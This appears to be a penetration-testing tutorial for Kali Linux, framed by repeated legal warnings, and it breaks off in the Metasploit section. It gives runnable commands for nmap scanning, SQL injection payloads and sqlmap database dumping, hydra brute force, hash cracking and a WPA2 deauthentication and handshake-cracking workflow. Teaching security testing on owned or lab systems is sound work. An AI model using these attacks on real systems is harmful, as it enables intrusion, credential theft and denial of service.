## Introduction: Why Kali Linux?

Kali Linux represents yet another Linux philosophy—one focused entirely on **security testing, penetration testing, and digital forensics**. Unlike Puppy (efficiency) or Tails (anonymity), Kali is designed for **offensive security professionals and ethical hackers**.

**What Makes Kali Unique:**
- 600+ pre-installed security tools
- Built by Offensive Security (creators of OSCP certification)
- Designed for penetration testing and security auditing
- Tools organized by attack methodology
- Regular updates with latest security tools
- Used by security professionals worldwide
- Based on Debian (stable, well-documented)

**Today's Learning Goals:**
- Understand ethical hacking and legal boundaries
- Master reconnaissance and information gathering
- Learn network scanning and vulnerability assessment
- Explore web application security testing
- Understand wireless security testing
- Practice password cracking and cryptanalysis
- Conduct safe, legal security assessments
- Build a security testing methodology

**Time Required:** 6-8 hours (with breaks)

**CRITICAL LEGAL WARNING:**

**You MUST have explicit written permission before testing any system you don't own.**

Unauthorized access to computer systems is illegal under:
- Computer Fraud and Abuse Act (USA)
- Computer Misuse Act (UK)
- Similar laws in virtually every country

**Today's exercises use:**
- Your own systems only
- Intentionally vulnerable practice environments
- Simulated targets designed for learning
- Legal, ethical testing scenarios

**Never test on:**
- Systems you don't own
- Networks you're not authorized to test
- Websites without written permission
- Any target without explicit consent

**Ethical hacking = Legal permission + technical skills + responsible disclosure**

---

## Morning Session (8:00 AM - 12:00 PM)

### Hour 1: Understanding Penetration Testing Methodology (8:00 - 9:00 AM)

Before touching any tools, you must understand the process and ethics of security testing.

#### The Penetration Testing Lifecycle

**1. Pre-Engagement:**
- Define scope (what can be tested)
- Obtain written authorization
- Establish rules of engagement
- Set timeline and deliverables
- **Without this: It's hacking, not testing**

**2. Information Gathering (Reconnaissance):**
- Passive reconnaissance (no direct contact)
- Active reconnaissance (scanning, probing)
- OSINT (Open Source Intelligence)
- Goal: Understand target infrastructure

**3. Threat Modeling:**
- Identify potential attack vectors
- Prioritize targets
- Map attack surface
- Plan approach

**4. Vulnerability Analysis:**
- Scan for known vulnerabilities
- Identify misconfigurations
- Find security weaknesses
- Enumerate services and versions

**5. Exploitation:**
- Attempt to exploit vulnerabilities
- Gain initial access
- Prove vulnerabilities are real
- **Only with explicit permission**

**6. Post-Exploitation:**
- Maintain access (persistence)
- Privilege escalation
- Lateral movement
- Data exfiltration (simulated)

**7. Reporting:**
- Document all findings
- Provide remediation advice
- Executive summary
- Technical details
- Risk ratings

#### Exercise 1: Ethical Hacking Scenarios (20 minutes)

**Evaluate the legality and ethics of each scenario:**

**Scenario A: Company Hired You**
- Company XYZ hires you to test their web application
- Written contract specifies scope and timeline
- Testing period: Next two weeks
- Targets: webapp.company.com only
- **Legal?** YES ✓
- **Ethical?** YES ✓
- **Proceed?** YES ✓ (with contract)

**Scenario B: Your Own Network**
- You want to test security of your home WiFi
- You own the router and all devices
- Only you use the network
- **Legal?** YES ✓
- **Ethical?** YES ✓
- **Proceed?** YES ✓ (perfect for learning)

**Scenario C: Friend Asks for Help**
- Friend thinks their website is vulnerable
- No written agreement
- Friend owns the website
- **Legal?** MAYBE (verbal permission insufficient)
- **Ethical?** MAYBE (intent is good)
- **Proceed?** NO ✗ (get written permission first)

**Scenario D: Bug Bounty Program**
- Company offers rewards for finding vulnerabilities
- Public bug bounty program with rules
- You follow all program guidelines
- **Legal?** YES ✓ (program is authorization)
- **Ethical?** YES ✓
- **Proceed?** YES ✓ (within program rules)

**Scenario E: Testing Without Permission**
- You notice a website seems insecure
- No relationship with company
- You "just want to help"
- **Legal?** NO ✗ (unauthorized access)
- **Ethical?** NO ✗ (no consent)
- **Proceed?** NO ✗ (report responsibly instead)

**Scenario F: School/Work Network**
- You have network access as student/employee
- Want to test for vulnerabilities
- No explicit permission to test
- **Legal?** NO ✗ (access ≠ testing permission)
- **Ethical?** NO ✗ (violates trust)
- **Proceed?** NO ✗ (ask IT/security team first)

**Key Takeaways:**
- Access ≠ Authorization to test
- Verbal permission is insufficient
- Get it in writing, always
- When in doubt, don't test
- Report vulnerabilities responsibly

#### Understanding Attack Surfaces

**Network Attack Surface:**
- Open ports and services
- Exposed servers
- Network devices (routers, switches)
- Wireless access points
- VPN endpoints

**Web Application Attack Surface:**

**Document findings:**
Create a simple attack surface map:
```
TARGET: example-shop.com

EXTERNAL SERVICES:
- Port 80/443: Web server
- Port 21: FTP
- Port 25: Email

WEB APPLICATIONS:
- /admin (WordPress)
- /login (Customer portal)
- /upload (File uploads)

POTENTIAL WEAKNESSES:
- FTP (unencrypted)
- WordPress (plugins?)
- User authentication
- File upload validation
```

---

### Hour 2: First Boot and Kali Environment (9:00 - 10:00 AM)

#### Booting Kali Linux

1. **Select Kali from Ventoy menu**
2. **Kali Boot Menu appears:**
   - "Live system" - Run without installing
   - "Live system (fail-safe mode)" - For compatibility
   - "Live system (forensic mode)" - No disk mounting

3. **Choose "Live system"** and press Enter

**What's Happening:**
- Kali loads into RAM (like Puppy)
- Hardware detection
- Networking initialization
- Desktop environment loading (XFCE default)

**Default Credentials (Live Mode):**
- Username: `kali`
- Password: `kali`

**Login Screen:**
- Enter credentials
- Desktop loads (XFCE environment)

#### Understanding the Kali Desktop

**Desktop Environment: XFCE (default) or GNOME**

**Top Panel:**
- **Applications menu** (top-left)
- **Open application windows**
- **System indicators** (network, volume, clock)
- **Power menu** (top-right)

**Key Desktop Elements:**

**Applications Menu Organization:**
- **01 - Information Gathering** (reconnaissance tools)
- **02 - Vulnerability Analysis** (scanners)
- **03 - Web Application Analysis** (web testing)
- **04 - Database Assessment** (database security)
- **05 - Password Attacks** (credential testing)
- **06 - Wireless Attacks** (WiFi security)
- **07 - Reverse Engineering** (malware analysis)
- **08 - Exploitation Tools** (exploit frameworks)
- **09 - Sniffing & Spoofing** (network analysis)
- **10 - Post Exploitation** (maintain access)
- **11 - Forensics** (digital investigation)
- **12 - Reporting Tools** (documentation)
- **13 - Social Engineering Tools** (human attacks)

**Notice the Organization:**
Tools are organized by **attack methodology**, not alphabetically. This teaches you the penetration testing process.

#### Exercise 3: Desktop Familiarization (20 minutes)

**Part A: Explore Tool Categories**

1. **Click Applications menu**
2. **Browse each category:**
   - Don't launch tools yet
   - Read tool descriptions
   - Notice how many tools per category
   - Understand the workflow

3. **Key categories to note:**
   - Information Gathering (starting point)
   - Vulnerability Analysis (finding weaknesses)
   - Exploitation (proving vulnerabilities)
   - Reporting (documenting findings)

**Part B: Open Terminal**

The terminal is your primary interface in Kali.

1. **Open terminal:**
   - Applications → System → Terminal
   - Or: Click terminal icon in panel
   - Or: Ctrl+Alt+T

2. **Notice the prompt:**
   ```
   ┌──(kali㉿kali)-[~]
   └─$
   ```
   - `kali㉿kali`: username@hostname
   - `~`: Current directory (home)
   - `$`: Regular user prompt (not root)

3. **Check your privileges:**
   ```bash
   whoami
   # Output: kali
   
   id
   # Shows: user and group memberships
   ```

**Part C: System Information**

Gather basic system information:

```bash
# Check Kali version
cat /etc/os-release

# Check kernel version
uname -a

# Check network interfaces
ip addr

# Check available disk space
df -h

# Check running processes
ps aux | head -20
```

**Part D: Update System (Important)**

Always update Kali before security testing:

```bash
# Update package lists
sudo apt update

# Upgrade installed packages
sudo apt upgrade -y

# This may take 5-10 minutes on first boot
```

**Why Updates Matter:**
- Security tools get frequent updates
- New vulnerabilities discovered daily
- Exploit databases need refreshing
- Bug fixes and improvements

#### Understanding Root vs. User Privileges

**Modern Kali runs as regular user by default (since 2020.1)**

**Why the Change?**
- Better security practice
- Prevents accidental system damage
- Mirrors real-world scenarios
- Use `sudo` for privileged operations

**When to use sudo:**
```bash
# Network scanning (needs raw sockets)
sudo nmap -sS target

# Wireless operations (needs monitor mode)
sudo airmon-ng start wlan0

# System-level operations
sudo apt install tool-name

# Some exploitation tools
sudo msfconsole
```

**When NOT needed:**
```bash
# Basic reconnaissance
whois domain.com

# Web application testing
nikto -h http://target

# Many vulnerability scanners
nmap -sV target
```

---

### Hour 3: Information Gathering and Reconnaissance (10:00 - 11:00 AM)

Information gathering is the **foundation** of all security testing. The better your reconnaissance, the more effective your testing.

#### Passive Reconnaissance

**Passive recon:** Gathering information **without** directly interacting with the target.

**Why passive first?**
- No logs on target systems
- No alerts triggered
- Legal in most jurisdictions (public information)
- Builds knowledge before active testing

#### Exercise 4: WHOIS Lookups (15 minutes)

**WHOIS:** Database of domain registration information.

**What WHOIS reveals:**
- Domain owner information
- Registration dates
- Name servers
- Contact information
- IP ranges

**Practice with public domain:**

```bash
# WHOIS lookup
whois example.com

# Information revealed:
# - Registrar
# - Registration date
# - Expiration date
# - Name servers
# - Sometimes: Registrant details
```

**Try multiple domains:**
```bash
whois google.com
whois github.com
whois kali.org
```

**Notice the differences:**
- Some use privacy protection (hidden details)
- Others show full information
- Different registrars, different data

**What attackers learn from WHOIS:**
- Company infrastructure
- Related domains
- Email addresses for phishing
- Registration patterns
- Potential expired domains

**Defensive takeaway:**
- Use domain privacy protection
- Use business email, not personal
- Monitor domain expiration
- Consistent registration info

#### DNS Reconnaissance

**DNS (Domain Name System):** Translates names to IP addresses.

**What DNS reveals:**
- IP addresses of servers
- Subdomain structure
- Mail server locations
- Load balancers
- CDN usage

**Exercise 5: DNS Enumeration (20 minutes)**

**Tool: dig (Domain Information Groper)**

```bash
# Basic DNS lookup
dig example.com

# Get just the answer
dig example.com +short

# Specific record types
dig example.com A      # IPv4 address
dig example.com AAAA   # IPv6 address
dig example.com MX     # Mail servers
dig example.com NS     # Name servers
dig example.com TXT    # Text records

# All records
dig example.com ANY
```

**Practice with real domain:**
```bash
# Look up Google's DNS
dig google.com

# Find mail servers
dig google.com MX

# Name servers
dig google.com NS
```

**Subdomain Enumeration:**

Subdomains often reveal organizational structure:

```bash
# Try common subdomains manually
dig www.example.com
dig mail.example.com
dig ftp.example.com
dig vpn.example.com
dig dev.example.com
dig staging.example.com
dig test.example.com
```

**Automated subdomain discovery (use responsibly):**

```bash
# DNSenum (installed in Kali)
dnsenum example.com

# This will:
# - Query name servers
# - Try zone transfer (usually fails)
# - Brute force subdomains
# - Check wildcard DNS
```

**What you discover:**
- Web servers (www, www2)
- Mail infrastructure (mail, smtp, imap)
- Development servers (dev, staging, test)
- VPN endpoints (vpn, remote)
- File servers (ftp, files)
- Internal naming conventions

#### Search Engine Reconnaissance

**Google Dorking:** Using advanced search operators to find sensitive information.

**Exercise 6: Google Dorks (15 minutes)**

**Important:** Use only for learning/research. Don't access sensitive data.

**Basic Google operators:**

```
site:        Search specific domain
filetype:    Search for file types
inurl:       Search in URL
intitle:     Search in page title
intext:      Search in page text
cache:       View cached version
```

**Practice searches (safe examples):**

```
# Find PDF files on a domain
site:example.com filetype:pdf

# Find login pages
site:example.com inurl:login

# Find admin panels
site:example.com inurl:admin

# Find exposed directories
site:example.com intitle:"index of"

# Find specific file types
site:example.com filetype:xls
site:example.com filetype:doc
```

**What attackers find with Google dorks:**
- Exposed configuration files
- Database backups
- Directory listings
- Login portals
- Sensitive documents
- Version information
- Error messages with system details

**Famous Google dorks (educational only):**

```
# Exposed cameras (don't access!)
intitle:"webcamXP 5"

# Exposed databases
intitle:"phpMyAdmin" inurl:"index.php"

# Configuration files
filetype:env "DB_PASSWORD"

# Backup files
filetype:sql "INSERT INTO"
```

**Defensive lessons:**
- Don't index sensitive pages (robots.txt)
- Don't put sensitive data on public servers
- Use authentication on admin panels
- Monitor what Google has indexed about you
- Request removal of sensitive cached pages

#### OSINT (Open Source Intelligence)

**OSINT:** Intelligence from publicly available sources.

**Sources:**
- Social media (LinkedIn, Twitter, Facebook)
- Company websites and blogs
- Job postings (reveal technologies used)
- GitHub repositories (code, credentials)
- Pastebin and leak sites
- Public documents and filings
- News articles and press releases

**Exercise 7: OSINT Framework (10 minutes)**

**Tool: TheHarvester**

Gathers emails, names, subdomains, IPs from public sources.

```bash
# Install if needed
sudo apt install theharvester

# Basic usage
theHarvester -d example.com -b google

# Multiple sources
theHarvester -d example.com -b all

# Save results
theHarvester -d example.com -b google -f output.html
```

**Sources available:**
- `-b google`: Google search
- `-b bing`: Bing search
- `-b linkedin`: LinkedIn profiles
- `-b twitter`: Twitter mentions
- `-b all`: All sources

**What you gather:**
- Email addresses (for phishing)
- Employee names (for social engineering)
- Subdomains (attack surface)
- IP addresses (network mapping)

**Real-world OSINT:**
- LinkedIn: Technologies used, employee count, hiring
- GitHub: Code repositories, hardcoded secrets
- Job postings: "Experience with Oracle 11g required"
- Social media: Employee names, roles, locations

---

### Hour 4: Active Reconnaissance and Network Scanning (11:00 AM - 12:00 PM)

**Active reconnaissance:** Direct interaction with the target.

**Warning:** Active scanning **will be logged**. Only scan systems you own or have permission to test.

#### Port Scanning with Nmap

**Nmap (Network Mapper):** The industry-standard port scanner.

**What port scanning reveals:**
- Open ports (services running)
- Service versions
- Operating system
- Firewall rules
- Network topology

#### Exercise 8: Nmap Basics (30 minutes)

**For practice, scan your own system:**

```bash
# Find your IP address
ip addr show

# Scan yourself (safe for learning)
nmap localhost

# Or scan your own IP
nmap 192.168.1.X  # Replace with your IP
```

**Nmap Scan Types:**

**1. TCP Connect Scan (Safe, Slow)**
```bash
nmap -sT target
# Completes three-way handshake
# Most detectable
# No root needed
```

**2. SYN Scan (Stealth, Fast)**
```bash
sudo nmap -sS target
# Half-open scan
# Doesn't complete handshake
# Less detectable
# Requires root
```

**3. UDP Scan**
```bash
sudo nmap -sU target
# Scans UDP ports
# Slower than TCP
# Important for DNS, SNMP, DHCP
```

**4. Version Detection**
```bash
nmap -sV target
# Probes services for version info
# Takes longer
# Very useful for vulnerability assessment
```

**5. OS Detection**
```bash
sudo nmap -O target
# Fingerprints operating system
# Requires root
# Not always accurate
```

**6. Aggressive Scan**
```bash
sudo nmap -A target
# Combines: -O -sV -sC --traceroute
# Comprehensive but noisy
# Triggers lots of IDS alerts
```

**Common Nmap Options:**

```bash
# Scan specific ports
nmap -p 80,443 target

# Scan port range
nmap -p 1-1000 target

# Scan all ports
nmap -p- target

# Fast scan (top 100 ports)
nmap -F target

# Save output
nmap -oN output.txt target
nmap -oX output.xml target
```

**Practice Scenarios:**

**Scenario 1: Quick Host Discovery**
```bash
# Find live hosts on your network
sudo nmap -sn 192.168.1.0/24
# Ping scan, no port scan
# Discovers live hosts only
```

**Scenario 2: Web Server Analysis**
```bash
# Scan web ports
nmap -p 80,443,8080,8443 target

# With version detection
nmap -sV -p 80,443 target
```

**Scenario 3: Comprehensive Scan**
```bash
# Full scan with all info
sudo nmap -sS -sV -O -p- target -oN scan_results.txt

# This will take a while on all 65535 ports!
```

**Understanding Nmap Output:**

```
PORT      STATE    SERVICE    VERSION
22/tcp    open     ssh        OpenSSH 8.2p1
80/tcp    open     http       Apache 2.4.41
443/tcp   open     ssl/http   Apache 2.4.41
3306/tcp  closed   mysql
8080/tcp  filtered http-proxy
```

**Port states:**
- **open:** Service accepting connections
- **closed:** Port accessible but no service
- **filtered:** Firewall blocking (can't determine)

**What attackers learn:**
- SSH open → Try brute force or exploit SSH
- Apache 2.4.41 → Search for known vulnerabilities
- MySQL closed → Database exists but not exposed
- Filtered port → Firewall present

#### Nmap Scripting Engine (NSE)

**NSE:** Powerful scripts for vulnerability detection.

```bash
# List available scripts
ls /usr/share/nmap/scripts/

# Search for specific scripts
ls /usr/share/nmap/scripts/ | grep http

# Use default scripts (safe)
nmap -sC target

# Use specific script
nmap --script=http-headers target

# Multiple scripts
nmap --script=http-enum,http-headers target
```

**Useful NSE scripts:**

```bash
# HTTP enumeration
nmap --script=http-enum -p 80 target

# SMB enumeration
nmap --script=smb-os-discovery target

# Vulnerability scanning
nmap --script=vuln target

# Brute force (use carefully!)
nmap --script=ssh-brute target
```

**Exercise: Scan a Vulnerable VM**

If you have access to vulnerable VMs (Metasploitable, DVWA):

```bash
# Comprehensive scan
sudo nmap -sS -sV -sC -O target_vm_ip -oN vuln_scan.txt

# Analyze results:
# - What services are running?
# - What versions detected?
# - Any obvious vulnerabilities?
# - What attack vectors exist?
```

---

## Lunch Break (12:00 PM - 1:00 PM)

**Take a real break!** Step away from the computer.

**Reflection Questions:**
- What surprised you about information gathering?
- How much can be learned without touching a target?
- What ethical considerations matter most?
- How would you defend against reconnaissance?

**Security Note:**
- Don't discuss specific targets you've scanned
- Don't share vulnerability findings publicly
- Consider the ethics of what you're learning
- Always obtain permission before testing

---

## Afternoon Session (1:00 PM - 5:00 PM)

### Hour 5: Vulnerability Assessment (1:00 - 2:00 PM)

After reconnaissance, identify specific vulnerabilities.

#### Web Application Vulnerability Scanning

**Common web vulnerabilities:**
- SQL Injection
- Cross-Site Scripting (XSS)
- Cross-Site Request Forgery (CSRF)
- Authentication bypasses
- File upload vulnerabilities
- Directory traversal
- Insecure configurations

#### Exercise 9: Nikto Web Scanner (20 minutes)

**Nikto:** Web server scanner that checks for dangerous files, outdated servers, and configuration issues.

**Setup Practice Target:**

For safe practice, we'll scan a deliberately vulnerable web application.

**Option 1: DVWA (Damn Vulnerable Web Application)**

```bash
# Install DVWA (if not already)
sudo apt install dvwa

# Start web server
sudo systemctl start apache2
sudo systemctl start mysql

# Access DVWA
# Open browser: http://localhost/dvwa
# Default login: admin / password
```

**Option 2: Scan a test site (with permission)**

```bash
# Scan localhost (your own system)
nikto -h http://localhost

# Scan specific port
nikto -h http://localhost:8080

# Save output
nikto -h http://localhost -o nikto_scan.txt
```

**Understanding Nikto Output:**

```
+ Server: Apache/2.4.41
+ Retrieved x-powered-by header: PHP/7.4.3
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found
+ Server may leak inodes via ETags
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
```

**What this reveals:**
- Server software and version
- PHP version (look for vulnerabilities)
- Missing security headers
- Allowed HTTP methods
- Directory structure

**Common findings:**
- Default files still present
- Outdated software versions
- Missing security headers
- Backup files exposed
- Directory listings enabled

#### Exercise 10: Directory Busting with Dirb/Gobuster (20 minutes)

**Directory busting:** Find hidden directories and files on web servers.

**Tool: dirb (included in Kali)**

```bash
# Basic scan
dirb http://localhost

# Use specific wordlist
dirb http://localhost /usr/share/wordlists/dirb/common.txt

# Look for specific extensions
dirb http://localhost -X .php,.html,.txt
```

**Tool: Gobuster (faster alternative)**

```bash
# Install if needed
sudo apt install gobuster

# Directory busting
gobuster dir -u http://localhost -w /usr/share/wordlists/dirb/common.txt

# With extensions
gobuster dir -u http://localhost -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

# Faster with more threads
gobuster dir -u http://localhost -w /usr/share/wordlists/dirb/common.txt -t 50
```

**Common wordlists in Kali:**

```bash
# View available wordlists
ls /usr/share/wordlists/

# Common directories
/usr/share/wordlists/dirb/common.txt

# Big directory list
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Web content
/usr/share/seclists/Discovery/Web-Content/
```

**What you might find:**
- /admin (administration panel)
- /backup (backup files)
- /config (configuration files)
- /uploads (user uploads)
- /test (development files)
- /.git (exposed git repository)
- /phpinfo.php (PHP information disclosure)

**Real-world example findings:**
- WordPress: /wp-admin, /wp-content, /wp-includes
- Joomla: /administrator
- Common: /admin, /login, /dashboard, /api

#### SQL Injection Basics

**SQL Injection:** Inserting malicious SQL code into application queries.

**How it works:**

```sql
# Normal query:
SELECT * FROM users WHERE username='admin' AND password='pass123'

# Injected input in username field: admin' OR '1'='1
# Resulting query:
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='pass123'

# '1'='1' is always true, so authentication bypassed!
```

**Exercise 11: SQL Injection Detection (15 minutes)**

**Using DVWA (if setup) or conceptually:**

**Test for SQL injection:**

1. **Login form testing:**
   ```
   Username: admin' OR '1'='1
   Password: anything
   
   # If vulnerable, you'll log in
   ```

2. **URL parameter testing:**
   ```
   http://target/product.php?id=1'
   
   # If error message appears with SQL syntax, vulnerable
   ```

3. **Common injection strings:**
   ```
   '
   ''
   `
   "
   )
   ')
   ")
   OR 1=1--
   ' OR 'a'='a
   admin'--
   ') OR ('1'='1
   ```

**SQLMap (Automated SQL Injection)**

```bash
# Test URL for SQL injection
sqlmap -u "http://target/page.php?id=1"

# Enumerate databases
sqlmap -u "http://target/page.php?id=1" --dbs

# Dump specific database
sqlmap -u "http://target/page.php?id=1" -D database_name --tables

# Dump table contents
sqlmap -u "http://target/page.php?id=1" -D database_name -T users --dump
```

**Warning:** SQLMap is powerful and can damage databases. Only use on systems you own or have explicit permission to test.

### Hour 6: Password Attacks and Cryptanalysis (2:00 - 3:00 PM)

Weak passwords are one of the most common vulnerabilities.

#### Password Cracking Fundamentals

**Attack types:**

1. **Dictionary Attack**
   - Try words from wordlist
   - Fast, good success rate
   - Effective against common passwords

2. **Brute Force**
   - Try all possible combinations
   - Slow but comprehensive
   - Time depends on password length

3. **Rule-Based Attack**
   - Dictionary + rules (append numbers, capitalize, etc.)
   - Balances speed and coverage
   - Mimics human password behavior

4. **Rainbow Tables**
   - Pre-computed hashes
   - Very fast lookup
   - Defeated by salting

#### Exercise 12: Hash Identification and Cracking (25 minutes)

**Step 1: Understand Password Hashing**

```bash
# MD5 hash (weak, don't use in production)
echo -n "password123" | md5sum
# Output: 482c811da5d5b4bc6d497ffa98491e38

# SHA256 hash (better)
echo -n "password123" | sha256sum
# Output: ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f
```

**Step 2: Create Practice Hashes**

```bash
# Create some test hashes
echo -n "admin" | md5sum > hash1.txt
echo -n "password" | md5sum > hash2.txt
echo -n "123456" | md5sum > hash3.txt
```

**Step 3: Use John the Ripper**

```bash
# Crack MD5 hash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt

# Show cracked passwords
john --show hash1.txt

# Crack with rules
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt --rules hash2.txt
```

**Step 4: Use Hashcat (GPU-accelerated)**

```bash
# Identify hash type
hashcat --example-hashes | grep -i md5

# Crack MD5 hash
hashcat -m 0 -a 0 hash1.txt /usr/share/wordlists/rockyou.txt

# Hash modes:
# -m 0: MD5
# -m 100: SHA1
# -m 1000: NTLM
# -m 1400: SHA256
# -m 1800: SHA512
```

**Understanding rockyou.txt:**

```bash
# Rockyou is famous wordlist (14 million passwords)
wc -l /usr/share/wordlists/rockyou.txt

# Extract if compressed
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# View most common passwords
head -20 /usr/share/wordlists/rockyou.txt
```

**Common passwords you'll see:**
```
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
```

**Exercise: Password Strength Analysis**

```bash
# Create test password hashes
echo -n "password" | md5sum > weak.txt
echo -n "P@ssw0rd123!" | md5sum > medium.txt
echo -n "Tr0ub4dor&3" | md5sum > strong.txt
echo -n "correcthorsebatterystaple" | md5sum > passphrase.txt

# Try cracking each
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt weak.txt
# Cracks instantly

john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt medium.txt
# Takes longer, might not crack

john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt strong.txt
# Unlikely to crack with dictionary

john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt passphrase.txt
# Might crack if common phrase
```

**Password Security Lessons:**

**Weak passwords:**
- Dictionary words
- Common patterns (qwerty, 123456)
- Personal info (name, birthday)
- Short length (<8 characters)

**Strong passwords:**
- Long (12+ characters)
- Mix of character types
- Not in dictionaries
- Unique per account
- Or: Long passphrases (correcthorsebatterystaple)

#### Online Password Attacks

**Hydra:** Network login cracker

**Warning:** Only test services you own or have permission to test. Online attacks are easily logged and can cause account lockouts.

**Exercise 13: Understanding Hydra (Conceptual - 15 minutes)**

**Hydra syntax:**
```bash
# SSH brute force (EXAMPLE ONLY - DON'T RUN ON REAL SYSTEMS)
hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://target

# HTTP form brute force
hydra -l admin -P passwords.txt target http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# FTP brute force
hydra -l admin -P passwords.txt ftp://target

# Multiple users
hydra -L users.txt -P passwords.txt ssh://target
```

**Options explained:**
- `-l`: Single username
- `-L`: Username list
- `-p`: Single password
- `-P`: Password list
- `-t`: Number of parallel tasks
- `-f`: Stop after first successful login

**Real-world considerations:**

**Defenses against brute force:**
- Account lockouts (3-5 failed attempts)
- Rate limiting (delay between attempts)
- CAPTCHA requirements
- IP blocking
- Multi-factor authentication

**Ethical considerations:**
- Online attacks are noisy (logged)
- Can lock out legitimate users
- May violate terms of service
- Only test with explicit permission
- Better: Test authentication strength offline

**Creating Custom Wordlists:**

```bash
# CeWL (Custom Word List generator)
# Crawls website and creates wordlist from content
cewl http://target.com -w custom_wordlist.txt

# Add common patterns
cewl http://target.com -w custom_wordlist.txt --with-numbers

# Minimum word length
cewl http://target.com -m 6 -w custom_wordlist.txt
```

**Why custom wordlists?**
- Target-specific terminology
- Company names
- Product names
- Employee names
- Better success rate than generic lists

### Hour 7: Wireless Security Testing (3:00 - 4:00 PM)

**Note:** Wireless testing requires compatible WiFi adapter. We'll cover concepts and commands even if you can't practice immediately.

#### WiFi Security Fundamentals

**WiFi security protocols:**

**WEP (Wired Equivalent Privacy):**
- Deprecated, very weak
- Can be cracked in minutes
- Should never be used

**WPA (WiFi Protected Access):**
- Better than WEP
- Still vulnerable to attacks
- Deprecated

**WPA2:**
- Current standard
- Strong when using long passwords
- Vulnerable to offline dictionary attacks

**WPA3:**
- Latest standard
- Resistant to offline attacks
- Not yet universally supported

#### WiFi Attack Methodology

**1. Monitor Mode:**
- Puts WiFi adapter in monitoring mode
- Can see all wireless traffic
- Doesn't associate with network

**2. Network Discovery:**
- Scan for available networks
- Identify security type
- Find target network

**3. Capture Handshake:**
- Wait for client to connect
- Or deauthenticate client (forces reconnect)
- Capture 4-way handshake

**4. Crack Password:**
- Use captured handshake
- Offline dictionary attack
- No interaction with network needed

#### Exercise 14: Wireless Tools Overview (20 minutes)

**Check WiFi adapter:**

```bash
# List network interfaces
iwconfig

# Or with newer tools
ip link show

# Look for wireless interface (wlan0, wlan1, etc.)
```

**Aircrack-ng Suite:**

The industry-standard WiFi security tools.

**1. Airmon-ng (Enable monitor mode)**

```bash
# Check for interfering processes
sudo airmon-ng check

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0
# Creates wlan0mon interface

# Verify monitor mode
iwconfig wlan0mon
```

**2. Airodump-ng (Capture packets)**

```bash
# Scan all channels
sudo airodump-ng wlan0mon

# Focus on specific channel
sudo airodump-ng -c 6 wlan0mon

# Capture to file
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

**Understanding airodump output:**

```
BSSID              PWR  CH  ENC  ESSID
AA:BB:CC:DD:EE:FF  -50   6  WPA2 HomeNetwork
11:22:33:44:55:66  -70  11  WPA2 OfficeWiFi
```

- **BSSID:** MAC address of access point
- **PWR:** Signal strength
- **CH:** Channel number
- **ENC:** Encryption type
- **ESSID:** Network name

**3. Aireplay-ng (Inject packets)**

```bash
# Deauthentication attack (capture handshake)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# -a: Access point MAC
# 10: Number of deauth packets
```

**4. Aircrack-ng (Crack password)**

```bash
# Crack captured handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# -w: Wordlist
# -b: BSSID (target network)
# capture-01.cap: Captured handshake file
```

#### Complete WiFi Attack Workflow (Conceptual)

**Step-by-step process:**

```bash
# 1. Enable monitor mode
sudo airmon-ng start wlan0

# 2. Discover networks
sudo airodump-ng wlan0mon
# Note: Target BSSID, channel, and ESSID

# 3. Capture handshake
# Terminal 1: Start capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Terminal 2: Force client reconnection
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Wait for "WPA handshake: AA:BB:CC:DD:EE:FF" message

# 4. Crack password (offline)
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# 5. Disable monitor mode
sudo airmon-ng stop wlan0mon
```

**Important notes:**

**Legal considerations:**
- Deauthentication is a denial of service attack
- Only test networks you own
- Capturing handshakes can be passive (waiting)
- Cracking is offline (legal on your own network)

**Success factors:**
- Password must be in wordlist
- Need complete 4-way handshake
- Strong passwords won't crack
- WPA3 resistant to this attack

**Defense recommendations:**
- Use WPA3 if available
- Long, random passwords (20+ characters)
- Disable WPS
- MAC filtering (minor security)
- Hide SSID (security through obscurity, weak)

#### Exercise 15: WiFi Security Assessment (15 minutes)

**Assess your own network security:**

**Questions to answer:**
1. What security protocol? (WEP/WPA/WPA2/WPA3)
2. How strong is your password?
3. Is WPS enabled? (vulnerable to brute force)
4. Are you broadcasting SSID?
5. Any guest network? (isolate guests)
6. Regular firmware updates?

**Recommendations:**
- Upgrade to WPA3 if supported
- Password: 20+ random characters
- Disable WPS completely
- Separate guest network (isolated)
- Regular router firmware updates
- Change default admin password

**Create security checklist:**
```
WIFI SECURITY CHECKLIST:
[ ] WPA2 or WPA3 enabled
[ ] Strong password (20+ characters)
[ ] WPS disabled
[ ] Default admin password changed
[ ] Firmware up to date
[ ] Guest network isolated
[ ] MAC filtering considered
[ ] Regular security audits
```

**What Metasploit provides:**
- Exploit database (thousands of exploits)
- Payload generation
- Post-exploitation modules
- Auxiliary modules (scanners, fuzzers)
- Consistent interface for exploitation

#### Exercise 16: Metasploit Console Basics (25 minutes)

**Launch Metasploit:**

```bash
# Start Metasploit console
sudo msfconsole

# Wait for banner and prompt
msf6 >
```

**Basic Metasploit commands:**

```bash
# Search for exploits
search windows smb

# Search for specific service
search apache

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show exploit information
info

# Show required options
show options

# Set target
set RHOSTS target_ip

